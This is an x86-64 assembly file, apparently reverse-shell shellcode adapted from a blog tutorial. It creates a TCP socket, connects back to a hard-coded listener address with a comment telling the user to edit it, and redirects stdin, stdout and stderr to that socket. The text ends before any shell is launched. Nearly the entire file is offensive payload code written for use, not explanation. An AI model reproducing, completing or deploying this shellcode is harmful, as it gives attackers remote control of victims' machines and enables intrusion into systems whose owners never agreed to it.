; Based loosely on https://systemoverlord.com/2018/10/30/understanding-shellcode-the-reverse-shell.html

; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
xor     rax, rax
xor     rdi, rdi
xor     rsi, rsi
xor     rdx, rdx
mov      al, 41
mov     dil, 2
mov     sil, 1
syscall

; !! Edit this section to connect back to your listener !!
;
; struct sockaddr_in {                  // Struct size: 16
;   short int           sin_family;     // AF_INET (2)
;   unsigned short int  sin_port;       // Set to 8080 below
;   struct in_addr      sin_addr;       // Set to 127.0.0.1 below
;   unsigned char       sin_zero[8];
; };
;
; struct in_addr {                      // Struct size: 4
;   uint32_t s_addr;
; };
xor     rbx, rbx
push    rbx
mov     rbx, 0x0100007f901f0002
push    rbx

; connect(fd, sockaddr, sizeof sockaddr)
mov     rdi, rax
mov     rsi, rsp
mov      dl, 16
xor     rax, rax
mov      al, 42
syscall

; dup2(fd, stdin)
; dup2(fd, stdout)
; dup2(fd, stderr)
xor     rsi, rsi
mov      al, 33
syscall
mov     sil, 1
mov      al, 33
syscall
mov     sil, 2
mov      al, 33
syscall
